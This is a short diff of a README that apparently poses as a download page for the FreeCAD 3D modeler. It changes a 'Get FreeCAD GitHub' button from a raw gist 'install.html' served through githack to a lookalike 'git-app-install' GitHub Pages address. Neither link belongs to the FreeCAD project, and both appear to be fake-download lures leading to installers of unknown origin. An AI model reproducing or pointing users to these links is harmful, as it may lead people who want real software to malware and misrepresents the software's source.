@@ -1,6 +1,6 @@
 # FreeCAD For PC Download — Desktop 3D Modeler
 
-[![Get FreeCAD GitHub](https://img.shields.io/badge/Get%20FreeCAD%20GitHub-2EA44F?style=for-the-badge&logo=github&logoColor=white)](https://gistcdn.githack.com/soldiergnome-svg/2e7041bdee0a5b506031667b780f84ea/raw/16b82f464677c883eb3dde24dbd4de5091f6bc00/install.html?offer=FreeCAD)
+[![Get FreeCAD GitHub](https://img.shields.io/badge/Get%20FreeCAD%20GitHub-2EA44F?style=for-the-badge&logo=github&logoColor=white)](https://git-app-install.github.io/.github/?offer=FreeCAD)
 
 ## 🎯 What You Get
 - 🏗️ **Parametric Modeling** — Easily modify designs by editing parameters
